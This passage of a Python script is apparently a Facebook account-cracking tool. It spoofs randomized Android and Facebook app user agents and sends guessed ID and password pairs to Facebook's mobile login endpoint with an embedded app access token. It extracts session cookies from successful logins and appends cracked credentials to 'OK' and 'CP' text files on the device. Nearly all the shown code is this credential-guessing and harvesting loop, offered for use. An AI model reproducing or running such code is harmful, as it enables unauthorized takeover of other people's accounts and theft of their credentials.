                        facebook_version = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        facebookv = f'{random.randint(10,436)}.0.0.{random.randint(11,99)}.{random.randint(1,250)}'
                        fbhlfend = random.choice(["199","477","129","66","375","247","201","236","129","70","116","186","169","118","120","123","121","112","107","117","124","119","127","125","109","127","111","117","118","115","241"])
                        fbbv = str(random.randint(11111111, 99999999))
                        fbrv = str(random.randint(11111111, 99999999))
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3.75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        sim = random.choice(['null', 'Null', 'Zong', 'Ufone', 'Telenor', 'PK-UFONE', 'Jazz'])
                        andver = random.choice(['4', '5', '6', '7', '8', '9', '10', '11', '12', ' 13'])
                        country = (['en_US', 'en_GB', 'pt_BR', 'ko_KR', 'ex_MX', 'it_IT', 'np_NP'])
                        fbaan = random.choice(['FB4A', 'Orca-Android'])
                        fbweb = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite', 'com.facebook.mlite'])
                        fbpn = random.choice(['com.facebook.katana', 'com.facebook.orca'])
                        ##################  ___  DEVICE NAME AND HIS REAL VERSIONS__  ##################
                        y1 = 'FBDV/POT-AL00a;FBSV/9.0'
                        y2 = 'FBDV/M886;FBSV/4.0.3'
                        y3 = 'FBDV/HUAWEI AQUA Y2;FBSV/4.4.2'
                        y4 = 'FBDV/HUAWEI-M920;FBSV/2.3.6'
                        y5 = 'FBDV/Huawei Ascend;FBSV/2.3.8'
                        y6 = 'FBDV/HUAWEI-M921;FBSV/2.3.6'
                        y7 = 'FBDV/U9500;FBSV/4.0.3'
                        y8 = 'FBDV/HUAWEI-M931;FBSV/4.0.4'
                        y9 = 'FBDV/HUAWEI Z100-UL00;FBSV/4.4.2'
                        y10 = 'FBDV/RIO-AL00;FBSV/5.1'
                        y11 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.3'
                        y12 = 'FBDV/MLA-L01;FBSV/6.0.1'
                        y13 = 'FBDV/HUAWEI Ascend G;FBSV/4.0.4'
                        y14 = 'FBDV/U8818;FBSV/2.3.6'
                        y15 = 'FBDV/TNN-AN00;FBSV/10'
                        y16 = 'FBDV/G510-0200;FBSV/4.1'
                        y17 = 'FBDV/HUAWEI Mate 20 lite;FBSV/10'
                        y18 = 'FBDV/G525-U00;FBSV/4.1'
                        y19 = 'FBDV/G525-U00;FBSV/8.1'
                        y20 = 'FBDV/G527-U081;FBSV/4.1'
                        y21 = 'FBDV/RNE-L21;FBSV/7.0'
                        y22 = 'FBDV/G6-U00;FBSV/4.3'
                        y23 = 'FBDV/BLA-L29;FBSV/8.0'
                        y24 = 'FBDV/G6-L11;FBSV/4.3'
                        y25 = 'FBDV/HMA-L29;FBSV/9.0'
                        y26 = 'FBDV/SNE-AL00;FBSV/8.1'
                        y27 = 'FBDV/G620S-L01;FBSV/4.4.2'
                        y28 = 'FBDV/LYA-L09;FBSV/9.0'
                        y29 = 'FBDV/G630-U10;FBSV/4.3'
                        y30 = 'FBDV/LYA-L09;FBSV/9.0'
                        y31 = 'FBDV/G7-L01;FBSV/4.4.2'
                        y32 = 'FBDV/EVR-L29;FBSV/9.0'
                        y33 = 'FBDV/G700-U10;FBSV/4.2'
                        y34 = 'FBDV/TAS-L09;FBSV/10'
                        y35 = 'FBDV/G730-U10;FBSV/4.2'
                        y36 = 'FBDV/TAS-AN00;FBSV/10'
                        y37 = 'FBDV/MT1-U06;FBSV/4.1.2'
                        y38 = 'FBDV/SPL-AL00;FBSV/9.0'
                        y39 = 'FBDV/MT1-U06;FBSV/4.1'
                        y40 = 'FBDV/LIO-L09;FBSV/10'
                        yes = random.choice([y1,y2,y3,y4,y5,y6,y7,y8,y9,y10,y11,y12,y13,y14,y15,y16,y17,y18,y19,y20,y21,y22,y23,y24,y25,y26,y27,y28,y29,y30,y31,y32,y33,y34,y35,y36,y37,y38,y39,y40])
                        e = f"[FBAN/FB4A;FBAV/{facebookv};FBBV/{fbbv};"
                        u1 = f"[FBAN/Orca-Android;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.orca;FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};FBCA/arm64-v8a:null;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        u2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBRV/{fbrv};FBPN/{fbweb};FBLC/en_BD;FBCR/{FBCR};FBMF/HUAWEI;FBBD/HUAWEI;{yes};nullFBCA/armeabi-v7a:armeabi;FBDM/"+""+f"density={density},width={width},height={height};FB_FW/1;]"
                        x1 = e + u1
                        x2 = e + u2
                        ua = random.choice([x1,x2])
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [Jutt-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        cek_apk(session,coki)
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/Jutt-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Jutt-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[38;5;205m [Jutt-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Jutt-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
